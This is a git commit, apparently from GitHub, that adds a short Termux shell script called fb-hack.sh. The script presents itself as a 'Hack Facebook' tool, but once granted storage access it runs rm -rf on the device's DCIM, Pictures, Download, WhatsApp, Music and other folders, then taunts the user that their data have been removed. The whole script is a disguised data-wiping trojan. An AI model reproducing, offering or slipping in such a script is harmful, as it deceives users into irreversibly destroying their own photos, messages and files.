f6a0f2fb9e757e9c7bfde826163cbfa5cea416be
Acep Triana <49948930+aceptriana@users.noreply.github.com>
2019-04-28 13:27:48 +0700

    Add files via upload

---
+++ fb-hack.sh
@@ -0,0 +1,18 @@
+figlet -standard "Hack Facebook" -F gay
+
+termux-setup-storage
+
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+
+echo "Your Data Have Been Remove :v" | lolcat
+echo "Gak Cyuka,kyta Gelut" | lolcat
+
+toilet -f standard "Acep Gans" | lolcat
